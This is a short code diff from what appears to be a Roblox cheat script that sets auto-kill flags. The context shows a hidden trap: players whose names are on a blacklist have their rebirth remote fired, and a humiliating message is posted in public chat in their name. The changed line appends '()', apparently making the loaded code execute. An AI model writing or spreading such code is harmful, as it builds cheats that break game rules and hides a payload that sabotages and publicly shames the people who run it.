@@ -23,7 +23,7 @@ if (table.find(BlacklistedNames, game:GetService("Players").LocalPlayer.Name:low
     game:GetService("ReplicatedStorage"):WaitForChild("rEvents"):WaitForChild("rebirthRemote"):InvokeServer("rebirthRequest")
     game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("eu gosto de homen e tentei usar um dos scripts do Sad", "All")
 end
-]])
+]])()
 
 getgenv().AutoKillTargets = getgenv().AutoKillTargets or {}
 getgenv().AutoKillEnabled = true
